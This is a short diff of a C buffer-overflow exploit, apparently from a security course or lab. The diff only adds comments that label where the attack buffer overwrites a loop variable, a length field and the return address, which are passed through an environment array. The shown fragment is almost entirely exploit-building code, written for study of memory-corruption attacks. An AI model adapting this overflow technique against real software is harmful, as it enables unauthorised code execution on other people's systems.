@@ -37,6 +37,7 @@ int main(void)
     // Overwrite the "i" variable
     ptr = (int*)&attack_buffer[216];
     *ptr = 0x000000c5; // Need three NULLs
+    // Overwrite the "len"
     ptr = (int*)&attack_buffer[220];
     *ptr = 0x000000d9; // Need three NULLs
 
@@ -47,10 +48,12 @@ int main(void)
     
     env[0] = "\0";
     env[1] = "\0";
+    // len
     env[2] = attack_buffer + 220;
     for (i = 3; i < 13; ++i) {
         env[i] = "\0";
     }
+    // Return address
     env[i] = attack_buffer + 232;
     env[i+1] = NULL;
 
